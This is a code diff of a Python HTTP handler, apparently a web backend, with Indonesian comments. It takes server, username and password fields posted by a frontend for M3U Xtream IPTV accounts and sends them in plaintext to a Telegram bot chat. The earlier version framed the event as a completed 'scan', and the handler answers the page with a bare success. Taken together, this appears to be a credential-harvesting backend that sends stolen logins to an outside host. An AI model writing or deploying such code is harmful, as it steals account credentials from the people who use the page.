@@ -9,6 +9,7 @@ def kirim_ke_telegram(pesan):
     chat_id = os.environ.get('TELEGRAM_CHAT_ID')
     
     if not token or not chat_id:
+        print("ERROR: Env var Telegram kosong!")
         return
 
     url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -16,6 +17,7 @@ def kirim_ke_telegram(pesan):
         "chat_id": chat_id,
         "text": pesan
     }
+    
     try:
         req = urllib.request.Request(
             url,
@@ -23,9 +25,9 @@ def kirim_ke_telegram(pesan):
             headers={'Content-Type': 'application/json'}
         )
         with urllib.request.urlopen(req, timeout=10) as resp:
-            pass
+            print("Sukses kirim ke Telegram")
     except Exception as e:
-        print(f"Gagal kirim Telegram: {e}")
+        print(f"Gagal kirim ke Telegram: {e}")
 
 class handler(BaseHTTPRequestHandler):
 
@@ -40,34 +42,44 @@ class handler(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_POST(self):
-        # 1. Ambil semua data header untuk pengecekan
         content_length = int(self.headers.get('Content-Length') or 0)
-        content_type = self.headers.get('Content-Type', 'unknown')
         
-        # 2. Baca data mentah dari frontend
+        # Baca body data mentah
         if content_length > 0:
             try:
                 post_data = self.rfile.read(content_length).decode('utf-8')
-            except Exception as e:
-                post_data = f"(Gagal membaca body: {e})"
+                print(f"Data masuk: {post_data}")
+            except Exception:
+                post_data = ""
         else:
-            post_data = "(BODY KOSONG / NO DATA)"
+            post_data = ""
 
-        # 3. KITA PAKSA KIRIM APAPUN YANG DIDAPAT KE TELEGRAM
-        pesan_debug = (
-            f"🔔 *WEB EVENT LOG* 🔔\n\n"
-            f"📊 *Status:* Scan Selesai Dipicu\n"
-            f"📦 *Content-Type:* {content_type}\n"
-            f"📏 *Content-Length:* {content_length}\n"
-            f"📝 *Data Mentah Kiriman Web:* \n`{post_data}`\n\n"
-            f"⏰ *Waktu:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
-        )
-        
-        kirim_ke_telegram(pesan_debug)
+        # Proses data untuk pesan Telegram
+        if post_data:
+            try:
+                data = json.loads(post_data)
+                # Sinkronisasi total dengan index.html (server, username, password)
+                server   = data.get('server') or data.get('host') or '-'
+                username = data.get('username') or data.get('usr') or '-'
+                password = data.get('password') or data.get('pwd') or '-'
+                
+                pesan = (
+                    f"LOG M3U XTREAM MASUK\n\n"
+                    f"Server  : {server}\n"
+                    f"Username: {username}\n"
+                    f"Password: {password}\n\n"
+                    f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
+                )
+            except Exception:
+                # Jika format bukan JSON, kirimkan teks mentahnya
+                pesan = f"LOG M3U RAW TEXT:\n\n{post_data}"
+            
+            # Eksekusi kirim
+            kirim_ke_telegram(pesan)
 
-        # 4. Beri respons balik ke Web agar tidak hang
+        # Kirim balik response sukses ke frontend web Anda
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
         self.send_header('Access-Control-Allow-Origin', '*')
         self.end_headers()
-        self.wfile.write(json.dumps({"status": "success", "received": True}).encode('utf-8'))
+        self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
